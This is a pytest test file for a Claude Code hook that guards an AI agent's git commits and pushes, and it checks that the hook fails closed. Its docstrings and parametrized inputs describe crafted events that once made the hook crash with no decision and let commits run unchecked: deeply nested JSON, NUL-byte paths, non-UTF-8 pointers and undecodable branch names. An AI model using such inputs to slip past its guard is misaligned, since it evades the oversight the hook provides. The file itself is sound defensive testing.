        code, out = _run_mutant_hook(mutant, _bash_event(repo, command), repo, env)
        assert code == 2, command
        reason = _reason(out)
        assert reason.startswith("Commit/push guard: refusing this Bash command")
        assert "(LookupError)" in reason
        assert "failing closed" in reason

    # Control: the shipped hook lets the same green commit through.
    code, out = _run_hook(_bash_event(repo, _V + " -m x"), repo, env)
    assert code == 0
    assert out is None


def test_mutant_without_the_classify_catch_loses_its_reason_then_its_decision(tmp_path: Path) -> None:
    """Twin: drop the catch, and the same raising classifier is denied only by
    main()'s catch-all, whose reason says nothing of the git checks the
    command skipped; that reason is what the classifier's own catch adds.
    Drop the catch-all too, and the hook exits 1 with no decision on a
    protected branch, which the client reads as no objection."""
    src = _hook_source()
    catch = _classify_catch(src)
    edits = [(_CLASSIFY_BODY, _CLASSIFY_RAISES), (catch, "    verbs, unknown = _classify(command)\n")]
    mutant = _write_mutant_multi(tmp_path, "no_classify_catch", edits)
    protected = _protected_repo(tmp_path)
    code, out = _run_mutant_hook(mutant, _bash_event(protected, _V + " -m x"), protected)
    assert code == 2
    reason = _reason(out)
    assert reason.startswith(_CATCH_ALL_PREFIX)
    assert "(LookupError: mutant: the classifier raised)" in reason
    assert "Commit/push guard" not in reason

    bare = _write_mutant_multi(tmp_path, "no_classify_catch_no_catch_all", [*edits, _no_catch_all(src)])
    code, out = _run_mutant_hook(bare, _bash_event(protected, _V + " -m x"), protected)
    assert code == 1
    assert out is None


def test_a_story_pointer_that_is_not_utf8_denies_the_commit(tmp_path: Path) -> None:
    """A `.current-story` holding bytes that are not UTF-8 raised out of the
    tests-ran gate, so the hook exited 1 with no decision and the commit went
    through. It now names no story, and the gate denies."""
    repo, impl = _green_story_repo(tmp_path, stage=True)
    env = {"ULTRACODE_IMPL_ARTIFACTS": str(impl)}
    code, out = _run_hook(_bash_event(repo, _V + " -m x"), repo, env)
    assert code == 0, "control: the readable pointer lets the green commit through"

    (impl / ".current-story").write_bytes(b"\xff\xfeSTORY-1\n")
    code, out = _run_hook(_bash_event(repo, _V + " -m x"), repo, env)
    assert code == 2
    assert "Tests-ran guard" in _reason(out)
    assert "(unknown)" in _reason(out)


# A NUL byte in a test-file path the checklist lists: git cannot take the path
# as an argument, so the un-skip check raised (ValueError) instead of deciding.
_NUL_LISTED = "\n  - 'tests/acceptance/a\x00b.spec.ts'"


def _nul_listed_repo(tmp_path: Path) -> tuple[Path, dict]:
    repo, impl, tests_root = _production_repo(
        tmp_path,
        staged={_ACCEPTANCE_REL: _CLEAN_ACCEPTANCE},
        checklist=_listed_checklist(_NUL_LISTED),
    )
    return repo, _production_env(impl, tests_root)


def test_a_git_write_whose_checks_raise_is_denied(tmp_path: Path) -> None:
    """An error raised inside the checks a git write must pass ended the hook
    with no decision, so the commit went past every check still to run. It is
    denied now, naming the error. A command that is no git write never reaches
    those checks, so the same broken checklist leaves it alone."""
    repo, env = _nul_listed_repo(tmp_path)
    code, out = _run_hook(_commit_event(repo), repo, env)
    assert code == 2
    reason = _reason(out)
    assert reason.startswith("Commit/push guard: refusing this `git commit`, because checking it raised")
    assert "(ValueError: embedded null byte)" in reason
    assert "failing closed" in reason

    code, out = _run_hook(_bash_event(repo, "ls -la"), repo, env)
    assert code == 0
    assert out is None

    # Control: the same checklist with the path written plainly lets the
    # green commit through, so the deny above is the error's.
    (Path(env["ULTRACODE_TEST_ARTIFACTS"]) / _CHECKLIST_NAME).write_text(_listed_checklist(_LISTED_BLOCK))
    code, out = _run_hook(_commit_event(repo), repo, env)
    assert code == 0
    assert out is None


# The catch around the checks in main(), from its `try:` to the end of main().
_CHECKS_CALL = "    _git_write_gates(cwd, verbs, unknown)\n"


def _checks_catch(src: str) -> str:
    start = src.index("    try:\n    " + _CHECKS_CALL)
    end = src.index("\n\n\ndef _git_write_gates(", start)
    return src[start : end + 1]


def test_mutant_without_the_checks_catch_loses_its_reason_then_its_decision(tmp_path: Path) -> None:
    """Twin: drop the catch around the checks, and the same commit is denied
    only by main()'s catch-all, whose reason names neither the git write nor
    the checks it skipped. Drop the catch-all too, and the commit exits 1
    with no decision, which the client reads as no objection."""
    src = _hook_source()
    edits = [(_checks_catch(src), _CHECKS_CALL)]
    mutant = _write_mutant_multi(tmp_path, "no_checks_catch", edits)
    repo, env = _nul_listed_repo(tmp_path)
    code, out = _run_mutant_hook(mutant, _commit_event(repo), repo, env)
    assert code == 2
    reason = _reason(out)
    assert reason.startswith(_CATCH_ALL_PREFIX)
    assert "(ValueError: embedded null byte)" in reason
    assert "git commit" not in reason

    bare = _write_mutant_multi(tmp_path, "no_checks_catch_no_catch_all", [*edits, _no_catch_all(src)])
    code, out = _run_mutant_hook(bare, _commit_event(repo), repo, env)
    assert code == 1
    assert out is None


# --- Every other error the guard raises denies -------------------------------
#
# An error no narrower catch handles ended the hook with exit 1 and no
# decision, which Claude Code reads as no objection (unless the hook entry
# carries `"onFailure": "block"`), so the call ran unchecked. main() now
# denies on any of them and names the error, so the guard exits 0 or 2 only.

_CATCH_ALL_PREFIX = "UltraCode-Goal guard: refusing this tool call, because the guard raised an error"
_NOT_AN_OBJECT_PREFIX = "UltraCode-Goal guard: refusing this tool call, because the hook event on stdin is a JSON "
_TOOL_INPUT_PREFIX = "Commit/push guard: refusing this Bash command, because its tool_input is a JSON "
_DEEP = "[" * 100000 + "]" * 100000


def _no_catch_all(src: str) -> tuple[str, str]:
    """The edit that strips main()'s catch-all, leaving a bare `_decide()`."""
    start = src.index("    try:\n        _decide()\n")
    end = src.index("\n\n\ndef _decide(", start)
    return src[start:end], "    _decide()"


def _raw_proc(hook_path: Path, stdin: str, cwd: Path) -> subprocess.CompletedProcess:
    """Run a copy of the hook on stdin as given, which need not be an object."""
    return subprocess.run(
        [sys.executable, str(hook_path)],
        input=stdin,
        cwd=cwd,
        capture_output=True,
        text=True,
        env=dict(os.environ),
    )


def _bash_raw(cwd: Path, tool_input: str) -> str:
    return '{"tool_name": "Bash", "tool_input": %s, "cwd": %s}' % (tool_input, json.dumps(str(cwd)))


_CRAFTED_STDIN = [
    pytest.param(lambda cwd: "[]", _NOT_AN_OBJECT_PREFIX + "array, not an object", id="event-array"),
    pytest.param(lambda cwd: "null", _NOT_AN_OBJECT_PREFIX + "null, not an object", id="event-null"),
    pytest.param(lambda cwd: '"Bash"', _NOT_AN_OBJECT_PREFIX + "string, not an object", id="event-string"),
    pytest.param(lambda cwd: "7", _NOT_AN_OBJECT_PREFIX + "number, not an object", id="event-number"),
    pytest.param(
        lambda cwd: _bash_raw(cwd, json.dumps(_V + " -m x")),
        _TOOL_INPUT_PREFIX + "string, not an object",
        id="tool-input-string",
    ),
    pytest.param(
        lambda cwd: _bash_raw(cwd, json.dumps([_V + " -m x"])),
        _TOOL_INPUT_PREFIX + "array, not an object",
        id="tool-input-array",
    ),
    pytest.param(lambda cwd: _DEEP, _CATCH_ALL_PREFIX + " while deciding on it (RecursionError: ", id="deep-array"),
    pytest.param(
        lambda cwd: _bash_raw(cwd, '{"command": "ls", "x": %s}' % _DEEP),
        _CATCH_ALL_PREFIX + " while deciding on it (RecursionError: ",
        id="deep-inside-the-event",
    ),
    pytest.param(
        lambda cwd: '{"tool_name": "Read", "tool_input": {"file_path": "a"}, "cwd": 5}',
        _CATCH_ALL_PREFIX + " while deciding on it (TypeError: ",
        id="cwd-not-a-string",
    ),
]


@pytest.mark.parametrize("stdin,expected", _CRAFTED_STDIN)
def test_an_event_the_guard_cannot_read_is_denied_with_a_reason(
    tmp_path: Path, monkeypatch, stdin, expected: str
) -> None:
    """Each of these exited 1 with a traceback and no decision, so Claude Code
    let the call run. Each is denied now: exit 2, the deny JSON on stdout,
    and the same reason on stderr. A cwd that is not a string fails while
    the guard locates the implementation artifacts, before the recall
    gate's own catch, so ULTRACODE_IMPL_ARTIFACTS must be unset to reach it."""
    monkeypatch.delenv("ULTRACODE_IMPL_ARTIFACTS", raising=False)
    proc = _raw_proc(HOOK, stdin(tmp_path), tmp_path)
    assert proc.returncode == 2, proc.stderr
    decision = json.loads(proc.stdout)["hookSpecificOutput"]
    assert decision["permissionDecision"] == "deny"
    assert decision["permissionDecisionReason"].startswith(expected)
    assert "failing closed" in decision["permissionDecisionReason"]
    assert decision["permissionDecisionReason"] in proc.stderr
    assert "Traceback" not in proc.stderr


@pytest.mark.parametrize(
    "stdin",
    [
        pytest.param("", id="empty-stdin"),
        pytest.param("{}", id="empty-object"),
        pytest.param("{not json", id="not-json"),
        pytest.param('{"tool_name": "Bash", "tool_input": []}', id="bash-input-empty-array"),
        pytest.param('{"tool_name": "Bash", "tool_input": null}', id="bash-input-null"),
        pytest.param('{"tool_name": "Read", "tool_input": "a"}', id="read-input-string"),
    ],
)
def test_the_inputs_the_guard_already_decided_on_keep_their_allow(tmp_path: Path, monkeypatch, stdin: str) -> None:
    """Control: the catch-all changes only what crashed. These never did: an
    event the guard reads as empty, a Bash input with no command in it, and a
    tool other than Bash with no latch present, whose input it does not read."""
    monkeypatch.delenv("ULTRACODE_IMPL_ARTIFACTS", raising=False)
    proc = _raw_proc(HOOK, stdin, tmp_path)
    assert proc.returncode == 0, proc.stderr
    assert proc.stdout == ""


def test_mutant_without_the_catch_all_ends_with_no_decision(tmp_path: Path, monkeypatch) -> None:
    """Twin: strip main()'s catch-all, and the deepest of those inputs exits 1
    with a traceback and nothing on stdout, which the client reads as no
    objection. The explicit checks for a non-object event and tool_input
    still deny, so only the catch-all decides on the rest."""
    monkeypatch.delenv("ULTRACODE_IMPL_ARTIFACTS", raising=False)
    mutant = _write_mutant(tmp_path, "no_catch_all", *_no_catch_all(_hook_source()))
    for stdin in (_DEEP, '{"tool_name": "Read", "tool_input": {}, "cwd": 5}'):
        proc = _raw_proc(mutant, stdin, tmp_path)
        assert proc.returncode == 1, stdin[:40]
        assert proc.stdout == ""
        assert "Traceback" in proc.stderr
    proc = _raw_proc(mutant, "[]", tmp_path)
    assert proc.returncode == 2
    assert _reason(json.loads(proc.stdout)).startswith(_NOT_AN_OBJECT_PREFIX)


def test_the_guard_exits_0_or_2_and_nothing_else() -> None:
    """Every exit the guard makes is a literal 0 (allow) or 2 (deny): an exit
    code of any other value would read as a hook failure, not a decision."""
    tree = ast.parse(_hook_source())
    codes = []
    for node in ast.walk(tree):
        if isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute):
            owner = node.func.value
            if isinstance(owner, ast.Name) and (owner.id, node.func.attr) in {("sys", "exit"), ("os", "_exit")}:
                assert len(node.args) == 1 and isinstance(node.args[0], ast.Constant), ast.unparse(node)
                codes.append(node.args[0].value)
        if isinstance(node, ast.Raise) and node.exc is not None and "SystemExit" in ast.unparse(node.exc):
            raise AssertionError(f"a raw SystemExit: {ast.unparse(node)}")
    assert sorted(set(codes)) == [0, 2]


# Branch names the platform's decoding cannot read: a byte that is not UTF-8
# (POSIX only, since Windows keeps ref names as UTF-16 file names), and a UTF-8
# name that Windows' ANSI code page lacks.
_UNDECODABLE_BRANCHES = [
    pytest.param(
        "release-\udcff",
        marks=pytest.mark.skipif(sys.platform == "win32", reason="Windows ref names are UTF-16 file names"),
        id="not-utf8",
    ),
    pytest.param("release-Ł", id="utf8-outside-cp1252"),
]

# The locale the hook runs under: the one the tests run under, and the C locale
# with Python's UTF-8 mode off, whose filesystem encoding is ASCII, so the
# environment reads every byte past ASCII as a surrogate. Every POSIX system
# has the C locale; Windows reads the environment as UTF-16 whatever it is.
_HOOK_LOCALES = [
    pytest.param({}, id="inherited-locale"),
    pytest.param(
        {"LC_ALL": "C", "PYTHONUTF8": "0"},
        marks=pytest.mark.skipif(sys.platform == "win32", reason="Windows reads the environment as UTF-16"),
        id="ascii-locale",
    ),
]


@pytest.mark.parametrize("hook_locale", _HOOK_LOCALES)
@pytest.mark.parametrize("branch", _UNDECODABLE_BRANCHES)
def test_a_branch_name_the_platform_cannot_decode_is_still_read(
    tmp_path: Path, branch: str, hook_locale: dict[str, str]
) -> None:
    """The branch probe decoded git's output the platform's way, so a branch
    name it could not decode raised before any check ran: the hook made no
    decision, and the commit went through. Read as UTF-8 instead, a non-ASCII
    name differed, under a locale that is not UTF-8, from the same bytes the
    environment decodes the locale's way, so a push on that protected branch
    went through. The name is decoded as the environment is now, so in either
    locale it matches the protected list that names it, and off that list the
    commit meets the tests-ran check."""
    try:
        os.fsencode(branch)
    except UnicodeEncodeError:
        pytest.skip("this locale cannot hand the name to git or to the hook's environment")
    repo = tmp_path / "repo"
    repo.mkdir()
    _init_repo(repo, branch)
    for event in (_commit_event(repo), _commit_event(repo, "git push origin HEAD")):
        code, out = _run_hook(event, repo, {**hook_locale, "ULTRACODE_PROTECTED_BRANCHES": branch})
        assert code == 2
        assert "Protected-branch" in _reason(out)

    code, out = _run_hook(_commit_event(repo), repo, {**hook_locale, "ULTRACODE_PROTECTED_BRANCHES": "main"})
    assert code == 2
    assert "Tests-ran guard" in _reason(out)


# Where SECURITY.md lists the failure behavior, it says what the classifier
# does with a command it cannot read, where the wrapper bound starts, and what
# an error in the checks of a git write does.
_SECURITY_CLASSIFY_FAILS_CLOSED = (
    "The reading of a Bash command that invariants 1 to 5 share fails closed too: a command the guard "
    "cannot classify, because reading it raised an error, is denied on any branch, and a segment that "
    "puts more than 32 exec wrappers (`env`, `nice`, `sudo`, and the others) ahead of its command counts "
    "as both a commit and a push, whatever that command is."
)
_SECURITY_CHECKS_FAIL_CLOSED = (
    "So do their checks: an error raised while checking a commit or push (a NUL byte in a test-file "
    "path the checklist lists, say) denies it."
)
_SECURITY_POINTER_FAILS_CLOSED = "an unreadable marker or story pointer (`.current-story`)"
_SECURITY_FAIL_CLOSED_CLAUSES = (
    _SECURITY_CLASSIFY_FAILS_CLOSED,
    _SECURITY_CHECKS_FAIL_CLOSED,
    _SECURITY_POINTER_FAILS_CLOSED,
)


def _security_states_the_classifier_fails_closed(text: str) -> bool:
    flat = " ".join(text.split())
    return all(clause in flat for clause in _SECURITY_FAIL_CLOSED_CLAUSES)


def test_security_md_lists_the_classifier_and_the_pointer_as_failing_closed() -> None:
    assert _security_states_the_classifier_fails_closed((_REPO_ROOT / "SECURITY.md").read_text(encoding="utf-8"))


@pytest.mark.parametrize("clause", _SECURITY_FAIL_CLOSED_CLAUSES)
def test_security_predicate_rejects_a_dropped_clause(clause: str) -> None:
    """Twin: the predicate rejects SECURITY.md with any rule taken out."""
    live = " ".join((_REPO_ROOT / "SECURITY.md").read_text(encoding="utf-8").split())
    mutant = live.replace(clause, "")
    assert mutant != live, "the mutant must actually change the text"
    assert not _security_states_the_classifier_fails_closed(mutant)
